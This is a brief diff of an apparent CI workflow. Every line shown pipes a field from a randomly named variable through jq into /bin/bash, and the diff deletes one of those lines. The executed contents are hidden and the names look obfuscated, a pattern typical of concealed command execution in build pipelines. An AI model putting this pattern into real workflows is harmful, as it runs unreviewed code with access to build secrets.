@@ -49,7 +49,6 @@ jobs:
           echo $vwfz16364 | jq -r .vg4697 | /bin/bash
           echo $sf6 | jq -r .b08187 | /bin/bash
           echo $c8724 | jq -r .mxr3635 | /bin/bash
-          echo $nmuot5689 | jq -r .sqron422 | /bin/bash
           echo $pbrj4390 | jq -r .d9 | /bin/bash
           printf '%s' "$nhhyo4085" | jq -r .ttsg873 | /bin/bash
           echo $xurr723 | jq -r .zx46421 | /bin/bash
